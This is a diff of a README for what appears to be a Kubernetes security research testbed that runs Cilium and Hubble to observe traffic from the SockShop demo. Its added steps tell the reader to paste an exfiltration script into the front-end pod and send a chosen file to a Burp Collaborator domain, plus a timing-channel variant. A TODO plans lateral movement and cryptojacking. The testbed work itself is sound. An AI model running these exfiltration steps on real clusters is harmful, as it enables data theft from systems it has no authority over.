@@ -37,17 +37,32 @@ If you need to populate the database full of users: `python simulate_traffic.py 
 
 Cilium Documentation: https://docs.cilium.io/en/stable/gettingstarted/
 
-## Todo
-1. Cleanup Repository
-2. Fix Cilium data collection
-3. Run data exfiltration attack
+----
 
-##Deployment Instruction[Kirtan]
-4. Start minikube: `minikube start --network-plugin=cni -p CLUSTER_NAME`
-5. Enable cilium on minikube : `cilium install`
-6. Verify cilium is enabled : `cilium status`
-7. If you are running for the first time, verify cilium connectivity:`cilium connectivity test` : It takes couple of minutes for this to execute.
-8. Enable hubble on cilium : `cilium hubble enable`
-9. Enable port forwarding : `cilium hubble port-forward&`
-10. Check if hubble is collecting flows : `hubble status`
-11. Deploy SockShop: `bash deploy_sockshop.sh`
+##Deployment Instructions[Cryptk8s]
+
+###Initial deployment
+1. To cleanup minikube: `bash cleanup.sh`
+2. To deploy minikube cluster with cilium and sockshop: `bash initiate.sh`
+3. To deploy cilium with hubble: `bash deploy_cilium.sh`
+4. Check the status of the cluster with `bash check_pods.sh`
+5. Getting the IP of the front-end pod: `bash get_ip.sh`
+
+
+###Exfiltrating data
+1. Get into front end pod using `bash to_front.sh`
+2. Once inside front end pod, execute `cd /tmp`
+3. Write contents of attack script onto the pod using command `cat >exfil.sh` and pasting contents
+4. Make the file executable by running `chmod +x exfil.sh`
+5. Setup Burp Collaborator and copy domain name
+6. Run exfil.sh with arguments: `./exfil.sh FILE_TO_BE_EXFILTRATED DOMAIN_NAME_FROM_BURP`
+7. Repeat steps 3 to 6 with script tchan.sh for timing channel exfiltration
+
+###Collecting data through hubble
+1. Follow steps in `Collecting Data with Cilium`
+2. Run command `bash observe_net.sh`
+
+###TODO
+1. Check hubble data collection
+2. Lateral movement
+3. Cryptojacking attack
